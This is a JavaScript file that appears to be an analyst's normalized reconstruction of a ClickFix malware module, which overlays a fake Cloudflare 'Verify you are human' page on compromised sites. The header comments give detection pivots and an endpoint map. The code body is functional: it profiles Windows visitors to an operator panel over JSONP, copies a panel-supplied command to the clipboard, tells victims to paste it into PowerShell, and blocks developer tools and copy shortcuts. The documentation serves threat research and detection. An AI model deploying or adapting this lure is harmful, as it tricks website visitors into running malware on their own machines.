/*
 * BW panel / Family A - Cloudflare ClickFix module
 *
 * Classification:
 *   clickfix
 *   bw-panel
 *   cloudflare-captcha
 *   compromise
 *
 * This module implements the Cloudflare presentation mode used by the
 * BW panel / Family A ClickFix kit.
 *
 * The module determines its panel origin from window.currentServer or
 * from the origin of the script that loaded it.
 *
 * Delivery begins on the visitor's first page click. Windows visitors
 * are profiled through /first_allow_host using JSONP. The request sends
 * browser and hardware information together with the victim origin and
 * the delivery method:
 *
 *   method=cloudflare_captcha
 *
 * The panel response contains:
 *
 *   id
 *       Per-visitor identifier used by subsequent panel requests.
 *
 *   allow
 *       Controls whether the ClickFix lure is displayed.
 *
 *   payload
 *       Command copied to the victim's clipboard.
 *
 * The returned payload supports three runtime substitutions:
 *
 *   REPLACE_SERVER
 *   REPLACE_ID
 *   REPLACE_RAY
 *
 * The module creates a Cloudflare-style verification overlay containing
 * the victim hostname, victim favicon, a generated Ray ID, Cloudflare
 * artwork and translated verification instructions.
 *
 * The lure instructs the victim to:
 *
 *   Win + X
 *   I / PowerShell / Terminal
 *   Ctrl + V
 *   Enter
 *
 * Checking the fake verification box copies the panel-supplied command
 * to the clipboard and reports progression through the panel.
 *
 * Operator API:
 *
 *   /first_allow_host
 *       Profile visitor, create visitor ID and deliver clipboard payload.
 *
 *   /check_allow_host
 *       Revalidate the visitor every five seconds.
 *
 *   /click_download
 *       Report presentation of the ClickFix lure.
 *
 *   /click_continue
 *       Report interaction with the verification workflow.
 *
 *   /click_win
 *       Report Windows-key activity after clipboard delivery.
 *
 * The module also exposes:
 *
 *   showCaptcha()
 *   hideCaptcha()
 *   cfCaptchaCompleteVerification()
 *
 * A unique DOM/script marker used by this build is:
 *
 *   R2FvKSeqkPMZAnMV
 *
 *
 * Page interaction
 *     |
 *     +-> first document click
 *           |
 *           +-> detect Windows
 *           |
 *           +-> determine panel origin
 *           |
 *           +-> JSONP /first_allow_host
 *                 |
 *                 +-> ua
 *                 +-> platform
 *                 +-> cpu
 *                 +-> ram
 *                 +-> origin
 *                 +-> language
 *                 +-> browser
 *                 +-> method=cloudflare_captcha
 *                 +-> layer=<panel origin>
 *                 |
 *                 +-> response
 *                       |
 *                       +-> id
 *                       +-> allow
 *                       +-> payload
 *                             |
 *                             +-> replace REPLACE_SERVER
 *                             +-> replace REPLACE_ID
 *                             +-> replace REPLACE_RAY
 *                             |
 *                             +-> display fake Cloudflare page
 *                                   |
 *                                   +-> /click_download
 *                                   |
 *                                   +-> visitor checks box
 *                                         |
 *                                         +-> copy payload
 *                                         |   to clipboard
 *                                         |
 *                                         +-> /click_continue
 *                                         |
 *                                         +-> poll:
 *                                         |   /check_allow_host
 *                                         |   every 5 seconds
 *                                         |
 *                                         +-> Windows-key activity
 *                                               |
 *                                               +-> /click_win
 *
 *
 * Presentation:
 *
 *   Cloudflare logo
 *   "Just a moment..."
 *   victim hostname
 *   victim-domain favicon
 *   fake 16-character Ray ID
 *   translated verification text
 *   "Performance and Security by Cloudflare"
 *
 *
 * Useful pivots:
 *
 *   cloudflare_captcha
 *   /first_allow_host
 *   /check_allow_host
 *   /click_download
 *   /click_continue
 *   /click_win
 *   REPLACE_SERVER
 *   REPLACE_ID
 *   REPLACE_RAY
 *   R2FvKSeqkPMZAnMV
 *   cfCaptchaCompleteVerification
 *   handleOtherServerResponse_
 *   showCaptcha
 *   hideCaptcha
 *
 *
 * ## Normalized
 */

(function (window) {
    "use strict";

    /*
     * Preserve the original single-load guard.
     */
    if (
        window.showCaptcha &&
        window.hideCaptcha
    ) {
        return;
    }

    const METHOD =
        "cloudflare_captcha";

    const MARKER_ID =
        "R2FvKSeqkPMZAnMV";

    const PROFILE_PATH =
        "/first_allow_host";

    const CHECK_PATH =
        "/check_allow_host";

    const DOWNLOAD_PATH =
        "/click_download";

    const CONTINUE_PATH =
        "/click_continue";

    const WINDOWS_PATH =
        "/click_win";

    const CHECK_INTERVAL_MS =
        5000;

    const INITIAL_LOAD_DELAY_MS =
        1500;

    const INSTRUCTION_DELAY_MS =
        2000;

    let visitorId = null;
    let clipboardPayload = "";

    let captchaCreated = false;
    let captchaState = "loading";

    let originalTitle = "";

    let checkTimer = null;
    let loadTimer = null;
    let successTimer = null;

    /*
     * The panel can provide its origin through window.currentServer.
     *
     * A directly loaded module derives the same value from its own
     * script URL.
     */
    function getPanelOrigin() {
        if (
            window.currentServer &&
            window.currentServer.includes(
                "https://"
            )
        ) {
            return new URL(
                window.currentServer
            ).origin;
        }

        if (
            document.currentScript &&
            document.currentScript.src
        ) {
            return new URL(
                document.currentScript.src
            ).origin;
        }

        return "";
    }

    const panelOrigin =
        getPanelOrigin();

    /*
     * Generate the fake Cloudflare Ray ID.
     */
    function createRayId() {
        const alphabet =
            "0123456789abcdef";

        let value = "";

        for (
            let index = 0;
            index < 16;
            index++
        ) {
            value +=
                alphabet[
                    Math.floor(
                        Math.random() *
                        alphabet.length
                    )
                ];
        }

        return value;
    }

    const rayId =
        createRayId();

    /*
     * Browser identification sent to the panel.
     */
    function detectBrowser() {
        if (
            navigator.userAgentData &&
            navigator.userAgentData.brands
        ) {
            const brands =
                navigator.userAgentData.brands
                    .map((entry) =>
                        entry.brand
                            .toLowerCase()
                    );

            if (
                brands.some(
                    (brand) =>
                        brand.includes("edge") ||
                        brand.includes(
                            "microsoft edge"
                        )
                )
            ) {
                return "msedge";
            }

            if (
                brands.some(
                    (brand) =>
                        brand.includes(
                            "chromium"
                        ) ||
                        brand.includes(
                            "google chrome"
                        )
                )
            ) {
                return "chrome";
            }

            if (
                brands.some(
                    (brand) =>
                        brand.includes(
                            "safari"
                        )
                )
            ) {
                return "safari";
            }

            if (
                brands.some(
                    (brand) =>
                        brand.includes(
                            "firefox"
                        )
                )
            ) {
                return "firefox";
            }

            if (
                brands.some(
                    (brand) =>
                        brand.includes(
                            "opera"
                        ) ||
                        brand.includes(
                            "opr"
                        )
                )
            ) {
                return "opera";
            }
        }

        const userAgent =
            (
                navigator.userAgent ||
                ""
            ).toLowerCase();

        if (
            userAgent.includes("edg") ||
            userAgent.includes("edge/") ||
            userAgent.includes("edga") ||
            userAgent.includes("edgios")
        ) {
            return "msedge";
        }

        if (
            userAgent.includes("opr/") ||
            userAgent.includes("opera")
        ) {
            return "opera";
        }

        if (
            userAgent.includes("chrome")
        ) {
            return "chrome";
        }

        if (
            userAgent.includes("firefox")
        ) {
            return "firefox";
        }

        if (
            userAgent.includes("safari")
        ) {
            return "safari";
        }

        if (
            userAgent.includes("trident") ||
            userAgent.includes("msie")
        ) {
            return "ie";
        }

        return "unknown";
    }

    /*
     * This campaign uses script elements as JSONP transports.
     */
    function jsonp(
        path,
        parameters,
        callback
    ) {
        const callbackName =
            "handleOtherServerResponse_" +
            Date.now() +
            "_" +
            Math.random()
                .toString(16)
                .slice(2);

        const script =
            document.createElement(
                "script"
            );

        window[callbackName] =
            function (response) {
                delete window[
                    callbackName
                ];

                script.remove();

                if (callback) {
                    callback(response);
                }
            };

        const query =
            new URLSearchParams({
                callback:
                    callbackName,
                ...parameters
            });

        script.src =
            panelOrigin +
            path +
            "?" +
            query.toString();

        script.onerror =
            function () {
                delete window[
                    callbackName
                ];

                script.remove();

                if (callback) {
                    callback(null);
                }
            };

        document.body.appendChild(
            script
        );
    }

    /*
     * Initial qualification.
     *
     * The response supplies the visitor ID, allow decision and command
     * used by the ClickFix clipboard lure.
     */
    function firstAllowHost(
        callback
    ) {
        const profile = {
            ua:
                navigator.userAgent,

            platform:
                navigator.platform,

            cpu:
                navigator
                    .hardwareConcurrency,

            ram:
                navigator
                    .deviceMemory,

            origin:
                window.location.origin,

            language:
                navigator.language ||
                navigator.userLanguage,

            browser:
                detectBrowser(),

            method:
                METHOD,

            layer:
                panelOrigin
        };

        jsonp(
            PROFILE_PATH,
            profile,
            function (response) {
                if (!response) {
                    callback(false);
                    return;
                }

                visitorId =
                    response.id;

                clipboardPayload =
                    String(
                        response.payload ||
                        ""
                    )
                        .replaceAll(
                            "REPLACE_SERVER",
                            panelOrigin
                        )
                        .replaceAll(
                            "REPLACE_ID",
                            visitorId
                        )
                        .replaceAll(
                            "REPLACE_RAY",
                            rayId
                        );

                callback(
                    Boolean(
                        response.allow
                    )
                );
            }
        );
    }

    /*
     * Keep asking the panel whether this visitor remains eligible.
     */
    function checkAllowHost(
        callback
    ) {
        jsonp(
            CHECK_PATH,
            {
                id: visitorId
            },
            function (response) {
                callback(
                    Boolean(
                        response &&
                        response.allow
                    )
                );
            }
        );
    }

    /*
     * Funnel telemetry.
     */
    function reportDownload() {
        jsonp(
            DOWNLOAD_PATH,
            {
                id: visitorId
            }
        );
    }

    function reportContinue() {
        jsonp(
            CONTINUE_PATH,
            {
                id: visitorId
            }
        );
    }

    function reportWindowsKey() {
        jsonp(
            WINDOWS_PATH,
            {
                id: visitorId
            }
        );
    }

    /*
     * Copy the panel-supplied command.
     */
    async function copyPayload() {
        if (
            navigator.clipboard &&
            navigator.clipboard.writeText
        ) {
            try {
                await navigator
                    .clipboard
                    .writeText(
                        clipboardPayload
                    );

                return;
            } catch {
            }
        }

        const textarea =
            document.createElement(
                "textarea"
            );

        textarea.value =
            clipboardPayload;

        document.body.appendChild(
            textarea
        );

        textarea.select();

        try {
            document.execCommand(
                "copy"
            );
        } catch {
        }

        textarea.remove();
    }

    /*
     * Lock common inspection and copy interactions after the victim
     * enters the verification workflow.
     */
    function lockPageInteraction() {
        const style =
            document.createElement(
                "style"
            );

        style.textContent = `
            * {
                user-select: none !important;
                -webkit-user-select: none !important;
                -webkit-touch-callout: none !important;
            }
        `;

        document.head.appendChild(
            style
        );

        document.addEventListener(
            "contextmenu",
            (event) =>
                event.preventDefault()
        );

        document.addEventListener(
            "selectstart",
            (event) =>
                event.preventDefault()
        );

        document.addEventListener(
            "dragstart",
            (event) =>
                event.preventDefault()
        );

        document.addEventListener(
            "drop",
            (event) =>
                event.preventDefault()
        );

        document.addEventListener(
            "keydown",
            function (event) {
                const key =
                    event.key
                        .toLowerCase();

                const modifier =
                    event.ctrlKey ||
                    event.metaKey;

                if (
                    modifier &&
                    [
                        "c",
                        "x",
                        "a",
                        "u",
                        "s",
                        "p"
                    ].includes(key)
                ) {
                    event
                        .preventDefault();
                }

                if (
                    key === "f12" ||
                    (
                        modifier &&
                        event.shiftKey &&
                        [
                            "i",
                            "j",
                            "c"
                        ].includes(key)
                    )
                ) {
                    event
                        .preventDefault();
                }

                if (
                    (
                        key === "escape" ||
                        key === "f11"
                    ) &&
                    document
                        .fullscreenElement
                ) {
                    event
                        .preventDefault();
                }
            }
        );

        setInterval(
            function () {
                if (
                    window.getSelection
                ) {
                    window
                        .getSelection()
                        .removeAllRanges();
                }
            },
            100
        );
    }

    /*
     * Prepare the full-page presentation.
     */
    function lockPageLayout() {
        document.body.style.overflow =
            "hidden";

        document.body.style.margin =
            "0";

        document.body.style.padding =
            "0";

        document.body.style.width =
            "100%";

        document.documentElement
            .style.overflow =
            "hidden";
    }

    /*
     * The original contains a large Cloudflare-style CSS block,
     * Cloudflare SVG artwork and translations for:
     *
     * en ar fr de it es pt nl ja zh ko tr hi id vi th pl cs
     *
     * This normalized renderer preserves the user-facing workflow.
     */
    function renderCloudflareShell(
        hostname
    ) {
        const container =
            document.createElement(
                "div"
            );

        container.id =
            "cfm";

        container.innerHTML = `
            <main id="cfm-main">
                <h1>
                    ${escapeHtml(
                        hostname
                    )}
                </h1>

                <h2>
                    Verify you are human
                    by completing the
                    action below.
                </h2>

                <div id="cfm-wg">
                    <div id="cfm-loading">
                        Loading...
                    </div>

                    <div
                        id="cfm-idle"
                        hidden
                    >
                        <label>
                            <input
                                id="cfm-cb"
                                type="checkbox"
                            >
                            Verify you are
                            human
                        </label>
                    </div>

                    <div
                        id="cfm-verifying"
                        hidden
                    >
                        Verifying...
                    </div>

                    <div
                        id="cfm-success"
                        hidden
                    >
                        Success!
                    </div>

                    <div
                        id="cfm-inst"
                        hidden
                    >
                        <ol>
                            <li>
                                Press Win + X
                            </li>

                            <li>
                                Press I or
                                choose
                                PowerShell /
                                Terminal
                            </li>

                            <li>
                                Press Ctrl + V
                            </li>

                            <li>
                                Press Enter
                            </li>

                            <li>
                                Cloudflare ID:
                                <code>
                                    ${rayId}
                                </code>
                            </li>
                        </ol>
                    </div>
                </div>

                <p>
                    Ray ID:
                    <code>
                        ${rayId}
                    </code>
                </p>

                <p>
                    Performance and
                    Security by Cloudflare
                </p>
            </main>
        `;

        document.body.appendChild(
            container
        );

        const checkbox =
            document.getElementById(
                "cfm-cb"
            );

        checkbox.addEventListener(
            "change",
            onCheckboxClick
        );

        captchaCreated = true;
    }

    function escapeHtml(value) {
        return String(value)
            .replaceAll(
                "&",
                "&amp;"
            )
            .replaceAll(
                "<",
                "&lt;"
            )
            .replaceAll(
                ">",
                "&gt;"
            )
            .replaceAll(
                "\"",
                "&quot;"
            );
    }

    function setState(
        state
    ) {
        captchaState = state;

        [
            "loading",
            "idle",
            "verifying",
            "success"
        ].forEach(
            function (name) {
                const element =
                    document
                        .getElementById(
                            "cfm-" +
                            name
                        );

                if (!element) {
                    return;
                }

                element.hidden =
                    name !== state;
            }
        );
    }

    /*
     * Clicking the fake checkbox enters the ClickFix workflow.
     */
    function onCheckboxClick() {
        if (
            captchaState !== "idle"
        ) {
            return;
        }

        captchaState =
            "verifying";

        setState(
            "verifying"
        );

        setTimeout(
            function () {
                const instructions =
                    document
                        .getElementById(
                            "cfm-inst"
                        );

                if (instructions) {
                    instructions.hidden =
                        false;
                }
            },
            INSTRUCTION_DELAY_MS
        );

        lockPageInteraction();

        copyPayload();

        reportContinue();

        startEligibilityPoll();

        /*
         * On Windows, metaKey corresponds to Windows-key activity.
         */
        document.addEventListener(
            "keydown",
            function (event) {
                if (event.metaKey) {
                    reportWindowsKey();
                }
            }
        );
    }

    function startEligibilityPoll() {
        checkTimer =
            setInterval(
                function () {
                    checkAllowHost(
                        function (
                            allowed
                        ) {
                            if (
                                allowed
                            ) {
                                return;
                            }

                            window
                                .hideCaptcha();

                            clearInterval(
                                checkTimer
                            );

                            window.location
                                .reload(true);
                        }
                    );
                },
                CHECK_INTERVAL_MS
            );
    }

    /*
     * The panel or another campaign component can call this exported
     * function when the verification workflow reaches completion.
     */
    window
        .cfCaptchaCompleteVerification =
        function () {
            if (
                captchaState !==
                "verifying"
            ) {
                return;
            }

            setState(
                "success"
            );

            successTimer =
                setTimeout(
                    function () {
                        setState(
                            "idle"
                        );
                    },
                    1700
                );
        };

    window.showCaptcha =
        function (options) {
            const platform =
                (
                    navigator.platform ||
                    ""
                ).toLowerCase();

            const userAgent =
                navigator.userAgent ||
                "";

            const isWindows =
                platform.includes(
                    "win"
                ) &&
                /windows/i.test(
                    userAgent
                );

            firstAllowHost(
                function (
                    allowed
                ) {
                    if (
                        isWindows &&
                        allowed
                    ) {
                        initialClickAbort
                            .abort();

                        lockPageLayout();

                        reportDownload();

                        if (
                            !document.body
                        ) {
                            document
                                .addEventListener(
                                    "DOMContentLoaded",
                                    function () {
                                        window
                                            .showCaptcha(
                                                options
                                            );
                                    }
                                );

                            return;
                        }

                        if (
                            !originalTitle
                        ) {
                            originalTitle =
                                document.title;
                        }

                        document.title =
                            "Just a moment...";

                        if (
                            !captchaCreated
                        ) {
                            renderCloudflareShell(
                                options &&
                                options.hostname
                                    ?
                                    options
                                        .hostname
                                    :
                                    window
                                        .location
                                        .hostname
                            );
                        }

                        setState(
                            "loading"
                        );

                        loadTimer =
                            setTimeout(
                                function () {
                                    setState(
                                        "idle"
                                    );
                                },
                                INITIAL_LOAD_DELAY_MS
                            );
                    }

                    document
                        .getElementById(
                            MARKER_ID
                        )
                        ?.remove();
                }
            );
        };

    window.hideCaptcha =
        function () {
            clearTimeout(
                loadTimer
            );

            clearTimeout(
                successTimer
            );

            captchaState =
                "loading";

            const captcha =
                document.getElementById(
                    "cfm"
                );

            if (captcha) {
                captcha.remove();
            }

            captchaCreated =
                false;

            if (
                originalTitle
            ) {
                document.title =
                    originalTitle;

                originalTitle = "";
            }
        };

    /*
     * The first interaction with the page launches qualification.
     *
     * AbortController removes this listener once the panel approves the
     * visitor.
     */
    const initialClickAbort =
        new AbortController();

    document.addEventListener(
        "click",
        function (event) {
            event.preventDefault();

            window.showCaptcha({
                onCheckboxClick:
                    onCheckboxClick
            });
        },
        {
            signal:
                initialClickAbort
                    .signal
        }
    );

    document
        .getElementById(
            MARKER_ID
        )
        ?.remove();
})(window);


/*
 * Original campaign protocol
 *
 * GET /first_allow_host
 *
 *   callback=<jsonp>
 *   ua=<navigator.userAgent>
 *   platform=<navigator.platform>
 *   cpu=<navigator.hardwareConcurrency>
 *   ram=<navigator.deviceMemory>
 *   origin=<window.location.origin>
 *   language=<navigator.language>
 *   browser=<detected browser>
 *   method=cloudflare_captcha
 *   layer=<panel origin>
 *
 * Response:
 *
 *   {
 *       id: "...",
 *       allow: true,
 *       payload: "..."
 *   }
 *
 *
 * Payload substitution:
 *
 *   payload
 *       .replaceAll(
 *           "REPLACE_SERVER",
 *           panelOrigin
 *       )
 *       .replaceAll(
 *           "REPLACE_ID",
 *           visitorId
 *       )
 *       .replaceAll(
 *           "REPLACE_RAY",
 *           rayId
 *       );
 *
 *
 * Progress telemetry:
 *
 *   /click_download?id=<visitor id>
 *   /click_continue?id=<visitor id>
 *   /click_win?id=<visitor id>
 *
 *
 * Eligibility:
 *
 *   /check_allow_host?id=<visitor id>
 *
 *   every 5000 ms
 *
 *
 * Clipboard:
 *
 *   navigator.clipboard.writeText(
 *       clipboardPayload
 *   )
 *
 * Fallback:
 *
 *   textarea
 *       -> select()
 *       -> document.execCommand("copy")
 *
 *
 * Exported functions:
 *
 *   window.showCaptcha
 *   window.hideCaptcha
 *   window.cfCaptchaCompleteVerification
 *
 *
 * Campaign marker:
 *
 *   R2FvKSeqkPMZAnMV
 */
